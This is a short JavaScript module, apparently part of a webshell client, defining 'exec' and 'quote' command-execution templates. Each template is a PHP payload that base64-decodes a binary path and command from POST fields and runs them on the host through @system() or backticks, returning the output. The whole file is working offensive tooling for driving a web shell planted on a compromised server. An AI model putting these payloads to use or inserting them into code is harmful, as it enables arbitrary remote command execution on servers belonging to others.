//
// 命令执行模板
// :默认使用`exec`代码模板
// 

import { arg1, arg2 } from './argv';

module.exports = {
  exec: {
    _:
      `$p=base64_decode($_POST["${arg1}"]);$s=base64_decode($_POST["${arg2}"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";@system($r." 2>&1",$ret);print ($ret!=0)?"ret={$ret}":"";`,
    [arg1]: "#{base64::bin}",
    [arg2]: "#{base64::cmd}"
  },

  quote: {
    _:
      `$p=base64_decode($_POST["${arg1}"]);$s=base64_decode($_POST["${arg2}"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";echo \`{$r} 2>&1\``,
    [arg1]: "#{base64::bin}",
    [arg2]: "#{base64::cmd}"
  }
}